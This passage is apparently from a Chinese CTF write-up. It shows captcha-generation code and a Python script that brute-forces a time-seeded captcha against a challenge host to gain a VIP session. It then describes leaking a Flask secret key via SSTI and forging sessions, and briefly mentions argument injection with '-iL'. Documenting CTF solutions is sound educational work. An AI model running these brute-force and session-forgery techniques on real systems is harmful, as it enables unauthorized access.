        y2 <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span>y1<span class="token punctuation">,</span> h <span class="token operator">-</span> int<span class="token punctuation">(</span>h <span class="token operator">/</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        points <span class="token operator">=</span> <span class="token punctuation">[</span>x1<span class="token punctuation">,</span> y1<span class="token punctuation">,</span> x2<span class="token punctuation">,</span> y2<span class="token punctuation">]</span>
        end <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">160</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span>
        start <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span>
        Draw<span class="token punctuation">(</span>image<span class="token punctuation">)</span><span class="token punctuation">.</span>arc<span class="token punctuation">(</span>points<span class="token punctuation">,</span> start<span class="token punctuation">,</span> end<span class="token punctuation">,</span> fill<span class="token operator">=</span>color<span class="token punctuation">)</span>
        <span class="token keyword">return</span> image

    @staticmethod
    <span class="token keyword">def</span> <span class="token function">create_noise_dots</span><span class="token punctuation">(</span>image<span class="token punctuation">:</span> Image<span class="token punctuation">,</span> color<span class="token punctuation">:</span> ColorTuple<span class="token punctuation">,</span> width<span class="token punctuation">:</span> int <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span> number<span class="token punctuation">:</span> int <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Image<span class="token punctuation">:</span>
        draw <span class="token operator">=</span> Draw<span class="token punctuation">(</span>image<span class="token punctuation">)</span>
        w<span class="token punctuation">,</span> h <span class="token operator">=</span> image<span class="token punctuation">.</span>size
        <span class="token keyword">while</span> number<span class="token punctuation">:</span>
            x1 <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> w<span class="token punctuation">)</span>
            y1 <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> h<span class="token punctuation">)</span>
            draw<span class="token punctuation">.</span>line<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x1<span class="token punctuation">,</span> y1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>x1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> y1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> fill<span class="token operator">=</span>color<span class="token punctuation">,</span> width<span class="token operator">=</span>width<span class="token punctuation">)</span>
            number <span class="token operator">-=</span> <span class="token number">1</span>
        <span class="token keyword">return</span> image

    <span class="token keyword">def</span> <span class="token function">_draw_character</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> c<span class="token punctuation">:</span> str<span class="token punctuation">,</span> draw<span class="token punctuation">:</span> ImageDraw<span class="token punctuation">,</span> color<span class="token punctuation">:</span> ColorTuple<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Image<span class="token punctuation">:</span>
        font <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>self<span class="token punctuation">.</span>truefonts<span class="token punctuation">)</span>

        left<span class="token punctuation">,</span> top<span class="token punctuation">,</span> right<span class="token punctuation">,</span> bottom <span class="token operator">=</span> draw<span class="token punctuation">.</span>textbbox<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> c<span class="token punctuation">,</span> font<span class="token operator">=</span>font<span class="token punctuation">)</span>
        w <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">1.7</span><span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token number">1</span>
        h <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token punctuation">(</span>bottom <span class="token operator">-</span> top<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">1.7</span><span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token number">1</span>

        dx1 <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>
        dy1 <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span>
        im <span class="token operator">=</span> createImage<span class="token punctuation">(</span><span class="token string">'RGBA'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>w <span class="token operator">+</span> dx1<span class="token punctuation">,</span> h <span class="token operator">+</span> dy1<span class="token punctuation">)</span><span class="token punctuation">)</span>
        Draw<span class="token punctuation">(</span>im<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">(</span>dx1<span class="token punctuation">,</span> dy1<span class="token punctuation">)</span><span class="token punctuation">,</span> c<span class="token punctuation">,</span> font<span class="token operator">=</span>font<span class="token punctuation">,</span> fill<span class="token operator">=</span>color<span class="token punctuation">)</span>

        <span class="token comment" spellcheck="true"># rotate</span>
        im <span class="token operator">=</span> im<span class="token punctuation">.</span>crop<span class="token punctuation">(</span>im<span class="token punctuation">.</span>getbbox<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        im <span class="token operator">=</span> im<span class="token punctuation">.</span>rotate<span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span> BILINEAR<span class="token punctuation">,</span> expand<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>

        <span class="token comment" spellcheck="true"># warp</span>
        dx2 <span class="token operator">=</span> w <span class="token operator">*</span> random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token number">0.3</span><span class="token punctuation">)</span>
        dy2 <span class="token operator">=</span> h <span class="token operator">*</span> random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">,</span> <span class="token number">0.3</span><span class="token punctuation">)</span>
        x1 <span class="token operator">=</span> int<span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token operator">-</span>dx2<span class="token punctuation">,</span> dx2<span class="token punctuation">)</span><span class="token punctuation">)</span>
        y1 <span class="token operator">=</span> int<span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token operator">-</span>dy2<span class="token punctuation">,</span> dy2<span class="token punctuation">)</span><span class="token punctuation">)</span>
        x2 <span class="token operator">=</span> int<span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token operator">-</span>dx2<span class="token punctuation">,</span> dx2<span class="token punctuation">)</span><span class="token punctuation">)</span>
        y2 <span class="token operator">=</span> int<span class="token punctuation">(</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token operator">-</span>dy2<span class="token punctuation">,</span> dy2<span class="token punctuation">)</span><span class="token punctuation">)</span>
        w2 <span class="token operator">=</span> w <span class="token operator">+</span> abs<span class="token punctuation">(</span>x1<span class="token punctuation">)</span> <span class="token operator">+</span> abs<span class="token punctuation">(</span>x2<span class="token punctuation">)</span>
        h2 <span class="token operator">=</span> h <span class="token operator">+</span> abs<span class="token punctuation">(</span>y1<span class="token punctuation">)</span> <span class="token operator">+</span> abs<span class="token punctuation">(</span>y2<span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token punctuation">(</span>
            x1<span class="token punctuation">,</span> y1<span class="token punctuation">,</span>
            <span class="token operator">-</span>x1<span class="token punctuation">,</span> h2 <span class="token operator">-</span> y2<span class="token punctuation">,</span>
            w2 <span class="token operator">+</span> x2<span class="token punctuation">,</span> h2 <span class="token operator">+</span> y2<span class="token punctuation">,</span>
            w2 <span class="token operator">-</span> x2<span class="token punctuation">,</span> <span class="token operator">-</span>y1<span class="token punctuation">,</span>
        <span class="token punctuation">)</span>
        im <span class="token operator">=</span> im<span class="token punctuation">.</span>resize<span class="token punctuation">(</span><span class="token punctuation">(</span>w2<span class="token punctuation">,</span> h2<span class="token punctuation">)</span><span class="token punctuation">)</span>
        im <span class="token operator">=</span> im<span class="token punctuation">.</span>transform<span class="token punctuation">(</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> h<span class="token punctuation">)</span><span class="token punctuation">,</span> QUAD<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
        <span class="token keyword">return</span> im

    <span class="token keyword">def</span> <span class="token function">create_captcha_image</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> chars<span class="token punctuation">:</span> str<span class="token punctuation">,</span> color<span class="token punctuation">:</span> ColorTuple<span class="token punctuation">,</span> background<span class="token punctuation">:</span> ColorTuple<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Image<span class="token punctuation">:</span>
        image <span class="token operator">=</span> createImage<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>_width<span class="token punctuation">,</span> self<span class="token punctuation">.</span>_height<span class="token punctuation">)</span><span class="token punctuation">,</span> background<span class="token punctuation">)</span>
        draw <span class="token operator">=</span> Draw<span class="token punctuation">(</span>image<span class="token punctuation">)</span>

        images<span class="token punctuation">:</span> t<span class="token punctuation">.</span>List<span class="token punctuation">[</span>Image<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
        <span class="token keyword">for</span> c <span class="token keyword">in</span> chars<span class="token punctuation">:</span>
            <span class="token keyword">if</span> random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0.5</span><span class="token punctuation">:</span>
                images<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_draw_character<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> draw<span class="token punctuation">,</span> color<span class="token punctuation">)</span><span class="token punctuation">)</span>
            images<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_draw_character<span class="token punctuation">(</span>c<span class="token punctuation">,</span> draw<span class="token punctuation">,</span> color<span class="token punctuation">)</span><span class="token punctuation">)</span>

        text_width <span class="token operator">=</span> sum<span class="token punctuation">(</span><span class="token punctuation">[</span>im<span class="token punctuation">.</span>size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">for</span> im <span class="token keyword">in</span> images<span class="token punctuation">]</span><span class="token punctuation">)</span>

        width <span class="token operator">=</span> max<span class="token punctuation">(</span>text_width<span class="token punctuation">,</span> self<span class="token punctuation">.</span>_width<span class="token punctuation">)</span>
        image <span class="token operator">=</span> image<span class="token punctuation">.</span>resize<span class="token punctuation">(</span><span class="token punctuation">(</span>width<span class="token punctuation">,</span> self<span class="token punctuation">.</span>_height<span class="token punctuation">)</span><span class="token punctuation">)</span>

        average <span class="token operator">=</span> int<span class="token punctuation">(</span>text_width <span class="token operator">/</span> len<span class="token punctuation">(</span>chars<span class="token punctuation">)</span><span class="token punctuation">)</span>
        rand <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token number">0.25</span> <span class="token operator">*</span> average<span class="token punctuation">)</span>
        offset <span class="token operator">=</span> int<span class="token punctuation">(</span>average <span class="token operator">*</span> <span class="token number">0.1</span><span class="token punctuation">)</span>

        <span class="token keyword">for</span> im <span class="token keyword">in</span> images<span class="token punctuation">:</span>
            w<span class="token punctuation">,</span> h <span class="token operator">=</span> im<span class="token punctuation">.</span>size
            mask <span class="token operator">=</span> im<span class="token punctuation">.</span>convert<span class="token punctuation">(</span><span class="token string">'L'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>point<span class="token punctuation">(</span>self<span class="token punctuation">.</span>lookup_table<span class="token punctuation">)</span>
            image<span class="token punctuation">.</span>paste<span class="token punctuation">(</span>im<span class="token punctuation">,</span> <span class="token punctuation">(</span>offset<span class="token punctuation">,</span> int<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>_height <span class="token operator">-</span> h<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> mask<span class="token punctuation">)</span>
            offset <span class="token operator">=</span> offset <span class="token operator">+</span> w <span class="token operator">+</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token operator">-</span>rand<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> width <span class="token operator">></span> self<span class="token punctuation">.</span>_width<span class="token punctuation">:</span>
            image <span class="token operator">=</span> image<span class="token punctuation">.</span>resize<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>_width<span class="token punctuation">,</span> self<span class="token punctuation">.</span>_height<span class="token punctuation">)</span><span class="token punctuation">)</span>

        <span class="token keyword">return</span> image

    <span class="token keyword">def</span> <span class="token function">generate_image</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> chars<span class="token punctuation">:</span> str<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Image<span class="token punctuation">:</span>
        background <span class="token operator">=</span> random_color<span class="token punctuation">(</span><span class="token number">238</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span>
        color <span class="token operator">=</span> random_color<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        im <span class="token operator">=</span> self<span class="token punctuation">.</span>create_captcha_image<span class="token punctuation">(</span>chars<span class="token punctuation">,</span> color<span class="token punctuation">,</span> background<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>create_noise_dots<span class="token punctuation">(</span>im<span class="token punctuation">,</span> color<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>create_noise_curve<span class="token punctuation">(</span>im<span class="token punctuation">,</span> color<span class="token punctuation">)</span>
        im <span class="token operator">=</span> im<span class="token punctuation">.</span>filter<span class="token punctuation">(</span>SMOOTH<span class="token punctuation">)</span>
        <span class="token keyword">return</span> im

    <span class="token keyword">def</span> <span class="token function">generate</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> format<span class="token punctuation">:</span> str <span class="token operator">=</span> <span class="token string">'png'</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">(</span>BytesIO<span class="token punctuation">,</span>str<span class="token punctuation">)</span><span class="token punctuation">:</span>
        code <span class="token operator">=</span> generate_code<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_length<span class="token punctuation">)</span>
        im <span class="token operator">=</span> self<span class="token punctuation">.</span>generate_image<span class="token punctuation">(</span>code<span class="token punctuation">)</span>
        out <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span>
        im<span class="token punctuation">.</span>save<span class="token punctuation">(</span>out<span class="token punctuation">,</span> format<span class="token operator">=</span>format<span class="token punctuation">)</span>
        out<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> out<span class="token punctuation">,</span> code

    <span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> output<span class="token punctuation">:</span> str<span class="token punctuation">,</span> format<span class="token punctuation">:</span> str <span class="token operator">=</span> <span class="token string">'png'</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">(</span>Image<span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">:</span>
        code <span class="token operator">=</span> generate_code<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_length<span class="token punctuation">)</span>
        im <span class="token operator">=</span> self<span class="token punctuation">.</span>generate_image<span class="token punctuation">(</span>code<span class="token punctuation">)</span>
        im<span class="token punctuation">.</span>save<span class="token punctuation">(</span>output<span class="token punctuation">,</span> format<span class="token operator">=</span>format<span class="token punctuation">)</span>
        <span class="token keyword">return</span> im<span class="token punctuation">,</span> code
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>而<code>/vip</code>是调用了<code>generate_code</code>方法生成验证码。</p>
<pre class="line-numbers language-python"><code class="language-python">@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/vip'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">vip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    captcha <span class="token operator">=</span> generate_code<span class="token punctuation">(</span><span class="token punctuation">)</span>
    captcha_user <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'captcha'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> captcha <span class="token operator">==</span> captcha_user<span class="token punctuation">:</span>
        session<span class="token punctuation">[</span><span class="token string">'vip'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"home.html"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">generate_code</span><span class="token punctuation">(</span>length<span class="token punctuation">:</span> int <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    
    characters <span class="token operator">=</span> <span class="token string">'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'</span>
    result <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>characters<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># I=I+1</span>
    <span class="token keyword">return</span> result
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里编写爆破脚本的思路就有了，我们可以先访问一次<code>/catpcha</code>让他重置一下种子，因为题目设置的<code>key</code>是由当前时间戳加个随机数生成的，所以这个种子是可以通过遍历爆破就能拿到。又因为<code>random.choice</code>是伪随机的，所以只要爆破对了<code>key</code>正确的验证码就出来了。</p>
<p>不过这里有两个坑：</p>
<ol>
<li>第一次生成验证码必须实例化<code>Captcha(200, 80,key=key)</code>，宽高必须对应上，好像是<code>random</code>里调用了指定的宽高，这样就打乱了后续（第二次第三次）生成验证码的逻辑，导致爆破不出来。</li>
<li>公共靶场，可能有别人也在访问路由从而破坏成功率。</li>
</ol>
<p>考虑到上面两个因素，写下了如下脚本，就算有人捣乱但是也不可能一直捣乱，只要一直请求就好了，实际测试几秒钟就能跑出来。</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> random
<span class="token keyword">import</span> time
<span class="token keyword">from</span> utils<span class="token punctuation">.</span>captcha <span class="token keyword">import</span> Captcha<span class="token punctuation">,</span>generate_code

flag<span class="token operator">=</span><span class="token boolean">False</span>
url<span class="token operator">=</span><span class="token string">"http://124.70.33.170:23001/"</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
    uuu<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"captcha"</span>
    number<span class="token operator">=</span>int<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>uuu<span class="token punctuation">)</span>
    cc1<span class="token operator">=</span>session<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"session"</span><span class="token punctuation">)</span>
    i<span class="token operator">=</span><span class="token number">0</span>

    <span class="token keyword">for</span> randoms <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        key <span class="token operator">=</span> number<span class="token operator">+</span>randoms
        <span class="token comment" spellcheck="true"># key = </span>
        gen <span class="token operator">=</span> Captcha<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span>key<span class="token operator">=</span>key<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#必须是填200,80.</span>
        buf <span class="token punctuation">,</span> captcha_text <span class="token operator">=</span> gen<span class="token punctuation">.</span>generate<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># gen = Captcha(key=1698630385)</span>
        <span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            captcha <span class="token operator">=</span> generate_code<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># print(captcha)</span>
        burp0_url <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"vip"</span>

        burp0_headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"Cache-Control"</span><span class="token punctuation">:</span> <span class="token string">"max-age=0"</span><span class="token punctuation">,</span> <span class="token string">"Upgrade-Insecure-Requests"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"Origin"</span><span class="token punctuation">:</span> <span class="token string">"http://124.70.33.170:23001"</span><span class="token punctuation">,</span> <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/json"</span><span class="token punctuation">,</span> <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"</span><span class="token punctuation">,</span> <span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"</span><span class="token punctuation">,</span> <span class="token string">"Referer"</span><span class="token punctuation">:</span> <span class="token string">"http://124.70.33.170:23001/"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7"</span><span class="token punctuation">,</span> <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">}</span>
        burp0_json<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"captcha"</span><span class="token punctuation">:</span> str<span class="token punctuation">(</span>captcha<span class="token punctuation">)</span><span class="token punctuation">}</span>
        <span class="token comment" spellcheck="true"># print(burp0_json)</span>
        session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>burp0_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>burp0_headers<span class="token punctuation">,</span> json<span class="token operator">=</span>burp0_json<span class="token punctuation">)</span>
        cc2<span class="token operator">=</span>session<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"session"</span><span class="token punctuation">)</span>
        i<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span>
        <span class="token keyword">if</span> cc1<span class="token operator">!=</span>cc2<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"sucess"</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>cc2<span class="token punctuation">)</span>
            flag<span class="token operator">=</span><span class="token boolean">True</span>
            <span class="token keyword">break</span>
    <span class="token keyword">if</span> flag<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"找到了"</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"没有找到，请重新运行"</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#sucess</span>
<span class="token comment" spellcheck="true">#eyJjYXB0Y2hhIjoieGRmQSIsInZpcCI6dHJ1ZX0.ZT8bDQ.JKzPFmo1IIlRlRxtBKT4Ut3tbms</span>
<span class="token comment" spellcheck="true">#找到了</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="session伪造打SSTI"><a href="#session伪造打SSTI" class="headerlink" title="session伪造打SSTI"></a>session伪造打SSTI</h5><p>直接用<code>&#123;&#123;config&#125;&#125;</code>就行，多试几次，因为是随机<code>WAF</code>。多试几次就会遇到没有ban掉<code>config</code>的垃圾<code>WAF</code>了，设置成功就能直接读取到<code>secret_key</code>了。</p>
<p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1698682680474.jpg" alt="1698682680474"></p>
<p>成功读取到<code>secret-key:16d07433931f178ff35c75e83924d5e9</code></p>
<p>伪造<code>session</code>打<code>ssti</code>即可。</p>
<p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1698682706411.jpg" alt="1698682706411"></p>
<p>带着<code>session</code>请求<code>/story</code>即可。</p>
<p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1698682734088.jpg" alt="1698682734088"></p>
<h4 id="MyGO’s-Live"><a href="#MyGO’s-Live" class="headerlink" title="MyGO’s Live!!!!!"></a>MyGO’s Live!!!!!</h4><p>第一道题直接上车了，就是<code>-iL </code>读文件然后输出到主页上。参数注入的题我个人不是很喜欢，并且自己也不擅长就没看。</p>
